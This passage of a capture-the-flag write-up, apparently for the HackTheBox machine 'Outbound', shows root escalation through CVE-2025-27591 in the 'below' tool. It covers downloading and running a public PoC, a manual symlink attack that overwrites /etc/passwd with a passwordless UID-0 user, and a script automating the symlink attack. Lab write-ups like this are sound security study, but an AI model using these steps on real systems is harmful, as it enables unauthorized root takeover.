-rw-r--r--   1 root      root                  0 Jul  8 20:40 ubuntu-advantage-apt-hook.log
-rw-------   1 root      root                195 Jul 10 12:10 vmware-network.1.log
-rw-------   1 root      root                253 Jul 10 12:06 vmware-network.2.log
-rw-------   1 root      root                195 Jul 10 11:44 vmware-network.3.log
-rw-------   1 root      root                193 Jul  9 13:36 vmware-network.4.log
-rw-------   1 root      root                193 Jul  9 12:39 vmware-network.5.log
-rw-------   1 root      root                193 Jul  8 20:52 vmware-network.6.log
-rw-------   1 root      root                193 Jul  8 20:49 vmware-network.7.log
-rw-------   1 root      root                193 Jul  8 20:38 vmware-network.8.log
-rw-------   1 root      root                250 Jul  8 11:13 vmware-network.9.log
-rw-------   1 root      root                195 Jul 15 04:27 vmware-network.log
-rw-------   1 root      root               3128 Jul 10 12:12 vmware-vmsvc-root.1.log
-rw-------   1 root      root               3831 Jul 10 12:06 vmware-vmsvc-root.2.log
-rw-------   1 root      root               3128 Jul  9 13:53 vmware-vmsvc-root.3.log
-rw-------   1 root      root               6166 Jul 15 04:28 vmware-vmsvc-root.log
-rw-------   1 root      root               5718 Jul 15 04:27 vmware-vmtoolsd-root.log
-rw-rw-r--   1 root      utmp              21888 Jul 15 04:30 wtmp
```

If we take a look closer to the `below` directory.

```bash
drwxrwxrwx   3 root      root               4096 Jul  8 20:45 below
```

We can see that the `below` directory is owned by `root` and the permission is `0777`. <br>
&rarr; Let's research about this `below`.

### Below
After searching about `below`, we found this [below](https://github.com/facebookincubator/below) github project. <br>
If we take a look at `Security` section, we can see [GHSA-9mc5-7qhg-fp3w](https://github.com/facebookincubator/below/security/advisories/GHSA-9mc5-7qhg-fp3w) advisory. <br>
&rarr; Let's take a look at this advisory.

It was about **Incorrect Permission Assignment for Critical Resource in below** that effect version `0.9.0`. <br>
If we check the permission of the `below` directory, we can see that the permission is `0777` which means that everyone can write to this directory as it was said from the impact *due to the creation of a world-writable directory at /var/log/below*. <br>
This vulnerability was assigned to [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591) and can also check in out on [Facebook Security Advisory](https://www.facebook.com/security/advisories/cve-2025-27591) which we can escalate privilege to root from local unprivileged user through symlink attack.

> To understand more about this vulnerability, we found this [blog](https://security.opensuse.org/2025/03/12/below-world-writable-log-dir.html) explaination from OpenSUSE.

Also another approach to figure it out this vulnerability is by checking the `below` directory.

```bash
jacob@outbound:/var/log/below$ ls -la
total 16
drwxrwxrwx  3 root  root   4096 Jul  8 20:45 .
drwxrwxr-x 13 root  syslog 4096 Jul 13 08:39 ..
-rw-rw-rw-  1 jacob jacob   236 Jul  8 20:45 error_jacob.log
-rw-rw-rw-  1 root  root      0 Jul  8 20:37 error_root.log
drwxr-xr-x  2 root  root   4096 Jul 13 08:39 store
```

If we look closer to this line.

```bash
-rw-rw-rw-  1 root  root      0 Jul  8 20:37 error_root.log
```

We can see that this file is empty but the permission is `0666` means that everyone can write to this file. <br>
&rarr; So we can leverage this point to perform a symlink attack.

## Privilege Escalation
### CVE-2025-27591
So as we can see that running the command above to check the privilege, we can see that we can run `below` command with `sudo` privilege.

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

When we run `below` command, we will see a monitor look pretty cool.

![outbound](/assets/img/outbound-htb-season8/outbound-htb-season8_below_monitor.png)

After searching for the CVE exploit PoC, we found this [CVE-2025-27591-PoC](https://github.com/BridgerAlderson/CVE-2025-27591-PoC) repository. <br>
&rarr; Let's escalate to root.

```bash
└─$ git clone https://github.com/BridgerAlderson/CVE-2025-27591-PoC.git

└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In `jacob` machine, run this command to download the exploit.

```bash
jacob@outbound:/tmp$ wget 10.xx.xx.xx:80/exploit.py
```

```bash
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.xx.xx - - [15/Jul/2025 01:08:46] "GET /exploit.py HTTP/1.1" 200 -
```

Let's run the exploit.

```bash
jacob@outbound:/tmp$ python3 exploit.py 
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Jul 15 05:09:16.594 DEBG Starting up!
Jul 15 05:09:16.594 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01752537600: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Copying payload into /etc/passwd via symlink...
[+] Running: cp /tmp/attacker /var/log/below/error_root.log
[*] Attempting to switch to root shell via 'su attacker'...
attacker@outbound:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Now we are `root` and we can get the `root.txt` flag.

```bash
attacker@outbound:/tmp# cd /root
attacker@outbound:~# ls -la
total 40
drwx------  6 attacker root 4096 Jul 15 04:27 .
drwxr-xr-x 23 attacker root 4096 Jul  8 20:14 ..
lrwxrwxrwx  1 attacker root    9 Jul  8 11:12 .bash_history -> /dev/null
-rw-r--r--  1 attacker root 3106 Apr 22  2024 .bashrc
drwx------  2 attacker root 4096 Jul  8 20:14 .cache
-rw-------  1 attacker root   20 Jul  9 13:53 .lesshst
drwxr-xr-x  3 attacker root 4096 Jul  8 20:14 .local
-rw-r--r--  1 attacker root  161 Apr 22  2024 .profile
-rw-r-----  1 attacker root   33 Jul 15 04:27 root.txt
drwxr-xr-x  2 attacker root 4096 Jul  9 13:47 .scripts
drwx------  2 attacker root 4096 Jul  8 20:14 .ssh
```

Also there is another approach for this by using symlink attack but we gonna craft our own command manually.

### Symlink attack
First, we will create a fake `passwd` file.
```bash
echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass
```

- Create a `pwn` user with `UID=0` (root privileges).
- No password (blank).
- Home directory is `/root`.
- Shell is `/bin/bash`.

Then we will replace file log with symlink.
```bash
rm -f /var/log/below/error_root.log && \
ln -s /etc/passwd /var/log/below/error_root.log && \
sudo /usr/bin/below
```

The flow is like this: <br>
- Delete the original log file: `rm -f /var/log/below/error_root.log`.
- Create a symlink: `ln -s /etc/passwd /var/log/below/error_root.log`.
- Now `error_root.log` points to `/etc/passwd`.
- Run below with sudo: `sudo /usr/bin/below`.
- `below` runs as root.
- When `below` logs, it will write to `/etc/passwd` (via symlink).

After that, we can work with `cp`.
```bash
cp /tmp/fakepass /var/log/below/error_root.log && su pwn
```

The reason why we need to do this is: <br>
- After `below` exits, the symlink will still exist for a short time.
- `cp` will copy the contents of `/tmp/fakepass` to `/var/log/below/error_root.log`.
- Since this is a symlink → the data is written to `/etc/passwd`.

&rarr; The result will be `/etc/passwd` is overwritten with the fake `passwd` file.

We can create a bash script to run this process.

```bash
#!/bin/bash
echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass
rm -f /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
sudo /usr/bin/below
```

Then we exit by `Ctrl + C` and then ssh back again to `jacob`. <br>
&rarr; Run this command to get the root privilege.

```bash
jacob@outbound:~$ cp /tmp/fakepass /var/log/below/error_root.log && su pwn
pwn@outbound:/home/jacob# whoami
pwn
```

```bash
pwn@outbound:/home/jacob# cd /root
pwn@outbound:~# ls -la
total 40
drwx------  6 pwn root 4096 Jul 13 08:39 .
drwxr-xr-x 23 pwn root 4096 Jul  8 20:14 ..
lrwxrwxrwx  1 pwn root    9 Jul  8 11:12 .bash_history -> /dev/null
-rw-r--r--  1 pwn root 3106 Apr 22  2024 .bashrc
drwx------  2 pwn root 4096 Jul  8 20:14 .cache
-rw-------  1 pwn root   20 Jul  9 13:53 .lesshst
drwxr-xr-x  3 pwn root 4096 Jul  8 20:14 .local
-rw-r--r--  1 pwn root  161 Apr 22  2024 .profile
-rw-r-----  1 pwn root   33 Jul 13 08:39 root.txt
drwxr-xr-x  2 pwn root 4096 Jul  9 13:47 .scripts
drwx------  2 pwn root 4096 Jul  8 20:14 .ssh
pwn@outbound:~# cat root.txt
9607dcxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Got the `root.txt` flag.

> The second way is something quite buggy so sometimes we need to restart the machine and redo the process again but it's not a big deal. :D

![result](/assets/img/outbound-htb-season8/result.png)